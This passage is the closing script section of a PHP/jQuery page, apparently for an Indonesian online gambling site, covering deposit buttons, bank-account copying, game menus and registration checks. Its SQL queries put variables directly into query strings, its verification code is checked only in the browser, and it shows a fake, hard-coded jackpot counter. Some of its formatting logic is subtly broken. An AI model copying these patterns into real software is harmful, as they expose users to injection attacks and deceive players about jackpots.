      if (isset($_GET['halaman'])) {
        if ($_GET['halaman'] == "beranda") {
    ?>
    var popupPengumuman = new bootstrap.Modal(document.getElementById("popup-pengumuman"), {});
    document.onreadystatechange = function () {
      popupPengumuman.show();
    };
    <?php
        } else if ($_GET['halaman'] == "daftar") {
    ?>
    function randomStringToInput(clicked_element) {
      var self = $(clicked_element);
      var random_string = generateRandomString2(5);
      $("input[name=kode_verifikasi]").val(random_string);
    }

    function generateRandomString2(string_length) {
      var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      var string = "";

      for(var i = 0; i <= string_length; i++) {
        var rand = Math.round(Math.random() * (characters.length - 1));
        var character = characters.substr(rand, 1);
        string = string + character;
      }

      return string;
    }
    <?php
        }
      }
    ?>
    
    $(document).ready(function () {
      // Input Hanya Angka
      $("#hanya-angka").on("input", function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        var nominal = $(this).val().replace(/ik/g, "b");
        var formatUang = new Intl.NumberFormat("en-US", {currency: "USD", maximumFractionDigits: 0});
        if ($(this).val().length === 0) {
          $("#notif-nominal").removeClass("d-none");
          $("#nominal").val("0");
        } else {
          $("#notif-nominal").addClass("d-none");
          $("#nominal").val(formatUang.format(nominal) + ",000");
        }
      });
      $("#hanya-angka-2").on("input", function() {
        this.value = this.value.replace(/[^0-9]/g, '');
      });
      $("#50").on("click", function () {
        $("#hanya-angka").val("50");
        $("#nominal").val("50,000");
      });
      $("#200").on("click", function () {
        $("#hanya-angka").val("200");
        $("#nominal").val("200,000");
      });
      $("#1000").on("click", function () {
        $("#hanya-angka").val("1000");
        $("#nominal").val("1,000,000");
      });
      // Show or Hide Bank Info Admin
      $(".bank-info").hide();
      $("#rekening-admin").on("change", function() {
        var optionSelected = $(this).find("option:selected");
        var valueSelected  = optionSelected.val();
        $(".bank-info").hide();
        $("#rekening-admin-" + valueSelected).show();
      });
      // Salin Nomor Rekening Admin
      <?php
        if (isset($_GET['kategori_rekening'])) {
          $query_rekening_admin = mysqli_query($koneksi, "SELECT * FROM rekening_admin WHERE kategori_rekening_admin = '$kategori_rekening_aktif'");
          while ($data_rekening_admin = mysqli_fetch_array($query_rekening_admin)) {
            $id_rekening_admin = $data_rekening_admin['id_rekening_admin'];
            $id_rekening_rekening_admin = $data_rekening_admin['id_rekening_rekening_admin'];
            $nama_rekening_admin = $data_rekening_admin['nama_rekening_admin'];
            $nomor_rekening_admin = $data_rekening_admin['nomor_rekening_admin'];

            $query_rekening = mysqli_query($koneksi, "SELECT * FROM rekening WHERE id_rekening = '$id_rekening_rekening_admin'");
            $data_rekening = mysqli_fetch_array($query_rekening);
            $kategori_rekening = $data_rekening['kategori_rekening'];
            $jenis_rekening = $data_rekening['jenis_rekening'];
      ?>
      $("#tombol-salin-<?php echo $id_rekening_admin; ?>").click(function() {
        // Menyimpan teks yang akan disalin ke variabel
        var textToCopy<?php echo $id_rekening_admin; ?> = $("#target-salin-<?php echo $id_rekening_admin; ?>").text();

        // Membuat elemen input untuk menyimpan teks
        var tempInput<?php echo $id_rekening_admin; ?> = $("<input>");
        $("body").append(tempInput<?php echo $id_rekening_admin; ?>);
        tempInput<?php echo $id_rekening_admin; ?>.val(textToCopy<?php echo $id_rekening_admin; ?>).select();

        // Menjalankan perintah salin
        document.execCommand("copy");
        $("#text-tombol-salin-<?php echo $id_rekening_admin; ?>").text("BERHASIL MENYALIN!");
        $("#ikon-salin-<?php echo $id_rekening_admin; ?>").removeClass("ri-file-fill").addClass("ri-check-fill");

        setTimeout(function () {
          $("#text-tombol-salin-<?php echo $id_rekening_admin; ?>").text("SALIN");
          $("#ikon-salin-<?php echo $id_rekening_admin; ?>").removeClass("ri-check-fill").addClass("ri-file-fill");
        }, 1500);

        // Menghapus elemen input
        tempInput<?php echo $id_rekening_admin; ?>.remove();
      });
      <?php
          }
        }
      ?>
      // Balik Beranda
      $("#beranda1, #beranda2, #beranda3, #beranda4").on("click", function () {
        window.location.replace("<?php echo $alamat_website; ?>");
      });
      $("#keluar").on("click", function () {
        window.location.replace("keluar.php");
      });
      // Show or Hide Password
      $("#peralihan-kata-sandi, #peralihan-kata-sandi-masuk-daftar").on("click", function () {
        $("#kata-sandi, #kata-sandi-masuk-daftar").toggleClass("ri-eye-line");
        var inputKataSandi = $("#input-kata-sandi, #input-kata-sandi-masuk-daftar");
        if (inputKataSandi.attr("type") === "password") {
          $("#kata-sandi, #kata-sandi-masuk-daftar").removeClass("ri-eye-off-line").addClass("ri-eye-line");
          inputKataSandi.attr("type", "text");
        } else {
          $("#kata-sandi, #kata-sandi-masuk-daftar").removeClass("ri-eye-line").addClass("ri-eye-off-line");
          inputKataSandi.attr("type", "password");
        }
      });
      $("#peralihan-kata-sandi-daftar").on("click", function () {
        $("#kata-sandi-daftar").toggleClass("ri-eye-line");
        var inputKataSandi = $("#input-kata-sandi-daftar");
        if (inputKataSandi.attr("type") === "password") {
          $("#kata-sandi-daftar").removeClass("ri-eye-off-line").addClass("ri-eye-line");
          inputKataSandi.attr("type", "text");
        } else {
          $("#kata-sandi-daftar").removeClass("ri-eye-line").addClass("ri-eye-off-line");
          inputKataSandi.attr("type", "password");
        }
      });
      $("#peralihan-kata-sandi-daftar-2").on("click", function () {
        $("#kata-sandi-daftar-2").toggleClass("ri-eye-line");
        var inputKataSandi = $("#input-kata-sandi-daftar-2");
        if (inputKataSandi.attr("type") === "password") {
          $("#kata-sandi-daftar-2").removeClass("ri-eye-off-line").addClass("ri-eye-line");
          inputKataSandi.attr("type", "text");
        } else {
          $("#kata-sandi-daftar-2").removeClass("ri-eye-line").addClass("ri-eye-off-line");
          inputKataSandi.attr("type", "password");
        }
      });
      // Syarat Nama Pengguna
      $(".syarat-nama-pengguna").on('input', function() {
        this.value = this.value.replace(/[^a-z0-9]/gi, '').toLowerCase();
      });
      // Syarat Kata Sandi
      $(".syarat-kata-sandi").keyup(function() {
        var kataSandi = $(this).val();
        var pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,20}$/;
        if (!pattern.test(kataSandi)) {
          $("#notif-syarat-kata-sandi").text("Harus ada huruf besar, kecil dan angka !");
        } else {
          if (kataSandi.length < 7) {
            $("#notif-syarat-kata-sandi").text("Minimal 8 karakter !");
          } else if (kataSandi.length > 7) {
            $("#notif-syarat-kata-sandi").empty();
          } else if (kataSandi.length > 19) {
            $("#notif-syarat-kata-sandi").text("Maksimal 20 karakter !");
            $(this).val(kataSandi.substring(0, 20));
          }
        }
      });
      $(".syarat-kata-sandi-2").keyup(function() {
        var kataSandi2 = $(this).val();
        var kataSandi1 = $(".syarat-kata-sandi").val();
        if (kataSandi2 != kataSandi1) {
          $("#notif-syarat-kata-sandi-2").text("Kata sandi tidak cocok !");
        } else {
          $("#notif-syarat-kata-sandi-2").empty();
        }
      });
      //Syarat Nama Lengkap & Nama Rekening
      function titleCase(str) {
        return str.toLowerCase().replace(/\b(\w)/g, function(txt) {
          return txt.toUpperCase();
        });
      }
      $(".syarat-nama-lengkap").keyup(function() {
        $(this).val(titleCase($(this).val()));
      });
      $(".syarat-nama-rekening").keyup(function() {
        $(this).val(titleCase($(this).val()));
      });
      // Kode Verifikasi
      $("#input-kode-verifikasi").keyup(function() {
        var kataSandi2 = $(this).val();
        var kataSandi1 = $("#kode-verifikasi").val();
        if (kataSandi2 != kataSandi1) {
          $("#notif-kode-verifikasi").text("Kode tidak cocok !");
        } else {
          $("#notif-kode-verifikasi").empty();
        }
      });
      // Refresh Saldo
      $("#refresh-saldo").click(function() {
        $("#saldo").load(location.href + " #saldo");
      });
      setInterval (function (){
        $("#saldo").load(location.href + " #saldo");
      }, 5000);
      // Counter
      let jackpot = 10000000000;
      let count = 41394775;

      let interval = setInterval(function() {
        count += 1.11;
        if (count >= jackpot) {
          clearInterval(interval);
          count = jackpot;
        }
        let formattedJackpot = count.toFixed(2).replace(/(\d)(?=(\d{3})+\.)/g, '1,');
        $('#counter').text(formattedJackpot);
      }, 10);
      // Owl Carousel
      $(".owl-carousel").owlCarousel({
        items: 1,
        loop: true,
        dots: true,
        autoplay: true,
        autoplayTimeout: 3000,
        autoplayHoverPause: true
      });
      // Scroll Kategori
      const scrollKategori = $("#scroll-kategori");
      const scrollKiri = $("#scroll-kiri");
      const scrollKanan = $("#scroll-kanan");

      scrollKiri.click(function () {
        scrollKategori.animate({
          scrollLeft: "-=100"
        }, "slow");
      });

      scrollKanan.click(function () {
        scrollKategori.animate({
          scrollLeft: "+=100"
        }, "slow");
      });
      // Promosi
      <?php
        $query_promosi = mysqli_query($koneksi, "SELECT * FROM promosi ORDER BY id_promosi DESC");
        while ($data_promosi = mysqli_fetch_array($query_promosi)) {
          $id_promosi = $data_promosi['id_promosi'];
          $gambar_promosi = $data_promosi['gambar_promosi'];
          $judul_promosi = $data_promosi['judul_promosi'];
          $detail_promosi = $data_promosi['detail_promosi'];
      ?>
      $("#expand_promosi_<?php echo $id_promosi; ?>").addClass("d-none");
      $("#promosi_<?php echo $id_promosi; ?>").on("click", function () {
        if ($("#expand_promosi_<?php echo $id_promosi; ?>").hasClass("d-none")) {
          $("#expand_promosi_<?php echo $id_promosi; ?>").removeClass("d-none").addClass("d-block");
        } else {
          $("#expand_promosi_<?php echo $id_promosi; ?>").removeClass("d-block").addClass("d-none");
        }
      });
      <?php
        }
      ?>
      // Dropdown Menu
      $("#expand_menu").addClass("d-none");
      $("#menu").on("click", function () {
        if ($("#expand_menu").hasClass("d-none") && $("#panah").hasClass("ri-arrow-right-s-line")) {
          $("#expand_menu").removeClass("d-none").addClass("d-block");
          $("#panah").removeClass("ri-arrow-right-s-line").addClass("ri-arrow-down-s-line");
        } else {
          $("#expand_menu").removeClass("d-block").addClass("d-none");
          $("#panah").removeClass("ri-arrow-down-s-line").addClass("ri-arrow-right-s-line");
        }
      });
      <?php
        $query_menu_games = mysqli_query($koneksi, "SELECT * FROM menu_games");
        while ($data_menu_games = mysqli_fetch_array($query_menu_games)) {
          $id_menu_games = $data_menu_games['id_menu_games'];
          $judul_menu_games = $data_menu_games['judul_menu_games'];
          $link_menu_games = $data_menu_games['link_menu_games'];
      ?>
      $("#expand_menu_<?php echo $id_menu_games; ?>").addClass("d-none");
      $("#menu_<?php echo $id_menu_games; ?>").on("click", function () {
        if ($("#expand_menu_<?php echo $id_menu_games; ?>").hasClass("d-none") && $("#panah_<?php echo $id_menu_games; ?>").hasClass("ri-arrow-right-s-line")) {
          $("#expand_menu_<?php echo $id_menu_games; ?>").removeClass("d-none").addClass("d-block");
          $("#panah_<?php echo $id_menu_games; ?>").removeClass("ri-arrow-right-s-line").addClass("ri-arrow-down-s-line");
        } else {
          $("#expand_menu_<?php echo $id_menu_games; ?>").removeClass("d-block").addClass("d-none");
          $("#panah_<?php echo $id_menu_games; ?>").removeClass("ri-arrow-down-s-line").addClass("ri-arrow-right-s-line");
        }
      });
      <?php
        }
      ?>
      // Flatpickr
      $(".tanggal-awal").flatpickr({
        dateFormat: "Y-m-d",
      });
      $(".tanggal-akhir").flatpickr({
        dateFormat: "Y-m-d",
      });
      // Datatables
      $("#riwayat").DataTable({
        ordering: false
      });
    });
  </script>
</body>
</html>